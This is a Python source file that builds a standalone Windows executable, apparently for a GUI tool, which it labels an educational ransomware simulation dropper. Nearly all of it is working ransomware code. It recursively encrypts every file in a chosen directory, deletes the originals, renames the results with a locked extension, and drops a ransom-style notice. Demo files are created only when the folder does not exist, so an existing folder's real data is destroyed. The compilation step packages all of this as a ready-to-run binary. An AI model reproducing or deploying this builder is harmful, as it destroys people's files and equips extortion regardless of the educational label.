#!/usr/bin/env python3
"""
SIMPLE EXE CREATOR FOR GUI
Direct implementation to avoid import issues
"""

import os
import sys
import subprocess
import tempfile
from pathlib import Path
from cryptography.fernet import Fernet

def create_exe_direct(target_directory, output_directory, encryption_key=None):
    """
    Direct EXE creation function for GUI use
    """
    # Generate key if not provided
    if encryption_key is None:
        key = Fernet.generate_key()
    else:
        key = encryption_key
    
    output_path = Path(output_directory)
    output_path.mkdir(exist_ok=True)
    
    # Create the encryptor script content
    script_content = f'''#!/usr/bin/env python3
"""
BACKUP FOLDER ENCRYPTOR - DIRECT VERSION
Educational ransomware simulation dropper
"""

import os
import sys
import base64
from pathlib import Path
from cryptography.fernet import Fernet
import time

def main():
    # Pre-generated encryption key
    key = {repr(key)}
    cipher = Fernet(key)
    target_dir = Path(r"{target_directory}")
    extension = ".backup_locked"
    
    print("=" * 60)
    print("BACKUP FOLDER ENCRYPTION DROPPER")
    print("=" * 60)
    print(f"Target Directory: {{target_dir}}")
    print("=" * 60)
    
    # Display key for educational purposes
    print(f"[KEY] {{base64.b64encode(key).decode()}}")
    print("")
    
    if not target_dir.exists():
        target_dir.mkdir(parents=True)
        print("[INFO] Created target directory")
        
        # Create demo files
        demo_files = {{
            "important_backup.txt": "This is important backup data",
            "family_photos.zip": "Family photos archive",
            "work_documents.rar": "Work documents",
            "financial_records.xlsx": "Financial records"
        }}
        
        for filename, content in demo_files.items():
            file_path = target_dir / filename
            with open(file_path, 'w') as f:
                f.write(content)
        print("[INFO] Created demo files for testing")
    
    print(f"[TARGET] Encrypting files in {{target_dir}}")
    time.sleep(1)
    
    encrypted_count = 0
    for file_path in target_dir.rglob("*"):
        if file_path.is_file() and not file_path.name.endswith(extension):
            try:
                print(f"[ENCRYPTING] {{file_path.name}}")
                
                with open(file_path, 'rb') as f:
                    data = f.read()
                    
                encrypted_data = cipher.encrypt(data)
                new_path = str(file_path) + extension
                
                with open(new_path, 'wb') as f:
                    f.write(encrypted_data)
                    
                file_path.unlink()
                encrypted_count += 1
                print(f"  -> Successfully encrypted")
                
            except Exception as e:
                print(f"  -> Failed to encrypt: {{e}}")
    
    # Create ransom note
    note_content = f"""================================
    BACKUP FOLDER ENCRYPTION NOTICE
================================

Your backup files have been encrypted by educational ransomware.

Target Directory: {{target_dir}}
Files Encrypted: {{encrypted_count}}
Extension Added: {{extension}}

This is an educational simulation designed to demonstrate:
- How ransomware targets backup directories
- The importance of offline backups
- Why backup security is crucial

Educational Purpose Only
================================
"""
    
    note_path = target_dir / "BACKUP_ENCRYPTION_NOTICE.txt"
    with open(note_path, 'w') as f:
        f.write(note_content)
    
    print(f"[NOTE] Created educational notice: {{note_path.name}}")
    print(f"[COMPLETE] Encrypted {{encrypted_count}} files")
    print("=" * 60)
    print("BACKUP FOLDER ENCRYPTION COMPLETE")
    print("=" * 60)
    
    # Handle exit gracefully
    try:
        input("\\nPress Enter to exit...")
    except (EOFError, OSError):
        print("\\nExecution completed.")
        import time
        time.sleep(2)

if __name__ == "__main__":
    main()
'''
    
    # Create temporary directory for build
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        
        # Write script
        script_file = temp_path / "encryptor_direct.py"
        with open(script_file, 'w') as f:
            f.write(script_content)
        
        # PyInstaller command
        cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--console",
            "--name", "BackupFolderEncryptor_Direct",
            "--distpath", str(output_path),
            "--workpath", str(temp_path / "build"),
            "--specpath", str(temp_path),
            str(script_file)
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                exe_path = output_path / "BackupFolderEncryptor_Direct.exe"
                if exe_path.exists():
                    return exe_path, key.decode()
            return None, None
            
        except Exception:
            return None, None

# Test function
if __name__ == "__main__":
    exe_path, key = create_exe_direct("D:\\TestDirect", "test_output")
    if exe_path:
        print(f"Created: {exe_path}")
        print(f"Key: {key}")